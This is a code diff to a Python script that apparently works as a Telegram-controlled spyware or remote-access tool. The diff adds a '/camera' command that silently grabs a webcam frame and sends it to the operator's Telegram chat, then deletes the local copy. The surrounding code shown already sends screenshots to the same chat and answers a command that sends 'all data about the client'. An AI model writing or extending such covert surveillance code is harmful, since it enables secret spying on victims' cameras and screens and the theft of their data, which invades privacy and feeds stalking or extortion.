@@ -15,7 +15,7 @@ import os
 from screeninfo import get_monitors
 import pyautogui
 import sys
-
+import cv2
 
 sv = sys.version
 pv = (sv[0] + sv[1] + sv[2] + sv[3] + sv[4] + sv[5])
@@ -176,6 +176,17 @@ def main():
                 bot.send_photo(get_chat_id(upd), uphoto, text)
                 uphoto.close()
                 os.remove("screenshot_pyautogui.png")
+            elif get_message_text(upd).lower() == "/camera":
+                cap = cv2.VideoCapture(0)
+                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+                ret, frame = cap.read()
+                cv2.imwrite('photo.png', frame)
+                cap.release()
+                uphoto = open("photo.png", "rb")
+                bot.send_photo(get_chat_id(upd), uphoto)
+                uphoto.close()
+                os.remove("photo.png")
             elif get_message_text(upd).lower() == "/infotxt":
                 send_message(get_chat_id(upd),
                              "Всі дані про клієнта в .txt форматі:")
